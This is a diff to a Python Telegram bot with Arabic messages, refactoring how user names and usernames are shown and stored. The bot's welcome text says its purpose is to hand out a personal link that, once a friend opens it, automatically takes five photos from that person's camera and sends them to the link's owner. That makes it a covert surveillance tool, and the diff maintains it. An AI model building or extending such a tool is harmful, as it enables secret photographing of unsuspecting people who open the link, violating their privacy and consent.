@@ -53,6 +53,26 @@ def rate_limit(user_id, limit=5, period=60):
     user_commands[user_id].append(now)
     return True
 
+def get_user_display_names(from_user):
+    """دالة مخصصة لمعالجة جلب الاسم واسم المستخدم بدقة"""
+    first_name = from_user.first_name or ""
+    last_name = from_user.last_name or ""
+    full_name = f"{first_name} {last_name}".strip()
+    username = from_user.username or ""
+
+    # الاسم المعروض
+    if full_name:
+        display_name = full_name
+    elif username:
+        display_name = f"@{username}"
+    else:
+        display_name = "مستخدم"
+
+    # اسم المستخدم مع @ إن وجد
+    handle_text = f"(@{username})" if username else ""
+
+    return display_name, username, handle_text
+
 def is_subscribed(user_id):
     """التحقق مما إذا كان المستخدم مشتركاً في القناة أم لا"""
     try:
@@ -177,15 +197,15 @@ def send_welcome(message):
         bot.send_message(user_id, sub_message, parse_mode="Markdown", reply_markup=markup, disable_web_page_preview=True)
         return
 
-    user_name = message.from_user.first_name
-    username = message.from_user.username or "غير محدد"
+    # معالجة جلب اسم المستخدم واليوزر بدقة
+    user_name, username, handle_text = get_user_display_names(message.from_user)
     is_new_user = False
 
     if user_id not in user_stats:
         is_new_user = True
         user_stats[user_id] = {
             "name": user_name,
-            "username": username,
+            "username": username or "غير محدد",
             "photo_count": 0,
             "first_seen": datetime.now().isoformat(),
             "last_active": datetime.now().isoformat(),
@@ -199,7 +219,7 @@ def send_welcome(message):
             f"━━━━━━━━━━━━━━━━━━\n"
             f"👤 *الاسم:* {user_name}\n"
             f"🆔 *المعرف:* `{user_id}`\n"
-            f"📝 *اليوزر:* @{username}\n"
+            f"📝 *اليوزر:* @{username if username else 'لا يوجد'}\n"
             f"📅 *التاريخ:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
             f"👥 *إجمالي المستخدمين:* {len(user_stats)}"
         )
@@ -208,9 +228,10 @@ def send_welcome(message):
         if len(user_stats) % 10 == 0:
             backup_data()
     else:
+        # تحديث الاسم واليوزر باستمرار لضمان صحة البيانات
         user_stats[user_id]["last_active"] = datetime.now().isoformat()
         user_stats[user_id]["name"] = user_name
-        user_stats[user_id]["username"] = username
+        user_stats[user_id]["username"] = username or "غير محدد"
         save_user_data()
 
     encrypted = encrypt_id(user_id)
@@ -232,11 +253,11 @@ def send_welcome(message):
     total_users = len(user_stats)
     
     response = (
-        f"👋 *أهلاً بك يا {user_name}!* في بوت الكاميرا الذكية 📸\n"
+        f"👋 *أهلاً بك يا {user_name}* {handle_text}! في بوت الكاميرا الذكية 📸\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
         f"🎯 *فكرة البوت:* \n"
         f"قم بنسخ الرابط وشاركه مع صديقك، بمجرد أن يفتحه سيتم التقاط 5 صور تلقائياً من الكاميرا وإرسالها إليك فوراً بحماية وتشفير تام 🔒\n\n"
-        f"🔗 *رابطك الخاص والجني جاهز:* \n"
+        f"🔗 *رابطك الخاص جاهز:* \n"
         f"`{personal_link}`\n\n"
         f"📌 *خطوات التشغيل السريعة:*\n"
         f"1️⃣ قم بنسخ الرابط أعلاه.\n"
@@ -288,23 +309,35 @@ def copy_link(call):
 
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
-    """عرض الإحصائيات بتصميم مميز"""
+    """عرض الإحصائيات بتصميم مميز وببيانات دقيقة"""
     if not rate_limit(message.chat.id):
         bot.reply_to(message, "⏰ يرجى الانتظار قليلاً قبل إعادة استخدام الأمر.")
         return
     
     user_id = message.chat.id
+    
+    # تحديث الاسم الحالي عند فتح الإحصائيات
+    user_name, username, handle_text = get_user_display_names(message.from_user)
+    
     if user_id in user_stats:
+        # تحديث الحقول المسجلة
+        user_stats[user_id]["name"] = user_name
+        user_stats[user_id]["username"] = username or "غير محدد"
+        save_user_data()
+        
         stat = user_stats[user_id]
         first_seen = parse_date(stat['first_seen'])
         last_active = parse_date(stat['last_active'])
         total_users = len(user_stats)
         
+        username_display = f"@{stat['username']}" if stat.get('username') and stat.get('username') != "غير محدد" else "لا يوجد"
+        
         response = (
             f"📊 *لوحة إحصائياتك الشخصية*\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"👤 *الاسم:* {stat['name']}\n"
-            f"🆔 *معرف الحساب:* `{user_id}`\n"
+            f"📝 *اليوزر:* {username_display}\n"
+            f"🆔 *معرف الحساب (ID):* `{user_id}`\n"
             f"📸 *الصور المستلمة:* `{stat['photo_count']}` صورة\n"
             f"🔗 *عدد مشاركات الرابط:* `{stat.get('total_links_shared', 0)}` مرة\n"
             f"📅 *تاريخ الانضمام:* `{first_seen.strftime('%Y-%m-%d %H:%M')}`\n"
@@ -380,7 +413,7 @@ def show_users_page(message, page):
     
     for uid, stat in users_list_items[start_idx:end_idx]:
         last_active = parse_date(stat['last_active'])
-        users_text += f"• *{stat['name']}* (@{stat['username']})\n"
+        users_text += f"• *{stat['name']}* (@{stat.get('username', 'لا يوجد')})\n"
         users_text += f"  🆔 `{uid}` | 📸 `{stat['photo_count']}` | 🕐 `{last_active.strftime('%Y-%m-%d')}`\n\n"
     
     markup = InlineKeyboardMarkup(row_width=2)
@@ -440,7 +473,6 @@ def send_help(message):
         return
     
     user_id = message.chat.id
-    total_users = len(user_stats)
     
     help_text = (
         f"💡 *دليل استخدام بوت الكاميرا الذكية*\n"
@@ -527,22 +559,25 @@ def handle_photos(message):
     """معالجة استقبال الصور الملتقطة"""
     global total_photos_received
     user_id = message.chat.id
-    user_name = message.from_user.first_name
-    username = message.from_user.username or "غير محدد"
+    
+    user_name, username, _ = get_user_display_names(message.from_user)
 
     if user_id in user_stats:
         user_stats[user_id]["photo_count"] += 1
+        user_stats[user_id]["name"] = user_name
+        user_stats[user_id]["username"] = username or "غير محدد"
         user_stats[user_id]["last_active"] = datetime.now().isoformat()
     else:
         user_stats[user_id] = {
             "name": user_name,
-            "username": username,
+            "username": username or "غير محدد",
             "photo_count": 1,
             "first_seen": datetime.now().isoformat(),
             "last_active": datetime.now().isoformat(),
             "total_links_shared": 0
         }
-        save_user_data()
+    
+    save_user_data()
     
     total_photos_received += 1
     save_user_data()
@@ -608,10 +643,12 @@ def handle_all_messages(message):
         bot.reply_to(message, "⏰ أنت ترسل الرسائل بسرعة، انتظر لبرهة.")
         return
     
+    user_name, _, _ = get_user_display_names(message.from_user)
+    
     if message.text and message.text.startswith('/'):
         bot.reply_to(message, "❌ *أمر غير معروف!*\n\nاستخدم /start للبدء أو /help للتعليمات.", parse_mode="Markdown")
     else:
-        bot.reply_to(message, f"أهلاً بك {message.from_user.first_name}! 👋\n\nاضغط /start للحصول على رابطك الخاص، أو استخدم القائمة (Menu) للوصول لكافة الخيارات.", parse_mode="Markdown")
+        bot.reply_to(message, f"أهلاً بك {user_name}! 👋\n\nاضغط /start للحصول على رابطك الخاص، أو استخدم القائمة (Menu) للوصول لكافة الخيارات.", parse_mode="Markdown")
 
 def get_bot():
     return bot, user_stats, total_photos_received
